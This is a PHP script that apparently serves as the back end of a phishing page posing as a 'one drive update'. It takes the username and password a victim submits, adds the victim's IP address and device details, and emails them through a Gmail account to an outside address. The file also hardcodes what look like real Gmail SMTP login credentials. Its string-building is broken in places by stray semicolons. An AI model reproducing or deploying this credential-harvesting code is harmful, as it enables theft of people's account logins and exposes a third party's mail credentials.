<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

require '../vendor/autoload.php';


$mail = new PHPMailer();

$mail->isSMTP();

$mail->SMTPDebug = SMTP::DEBUG_SERVER;
 

$mail->Host = 'smtp.gmail.com';

$mail->Port = 465;

$mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;

$mail->Username = 'twitterbundle@gmail.com';

//Password to use for SMTP authentication
$mail->Password = 'heqywiacbgjtufyr';
$mail->SMTPAuth = true;

$mail->setFrom('twitterbundle@gmail.com', 'Delivery');

$mail->addAddress('znwasike@gmail.com', 'agz');

 $mail->isHTML(true);                                 
    $mail->Subject = 'one drive update';
    include("iplogger.php");
if ($_SERVER['REQUEST_METHOD'] === 'POST') 
{   $ip = getenv("REMOTE_ADDR");}
    $mail->Body    =  $data = "username:" .$_POST['username']."\n".    
            "password:" .$_POST['password']."\n".    
            "Date:"     .(new DateTime("now", new DateTimeZone('Asia/Karachi')))->format('Y-m-d H:i:sA')."\n\n"; 
            "IP : ".$ip."\n";$IP=$_POST['IP'];  
            "User Agent:".$user_agent."\n".
            "OS:".Operating_System($user_agent)."\n".
            "Browser:".Browser($user_agent)."\n".
            "Device:".Device($user_agent)."\n".
            "IP:".GetIP()."\n".


    if(isset($_POST['username'])) echo "<script>window.location.replace('././websites/errorc398.html?username=".$_POST['username']."');</script>";

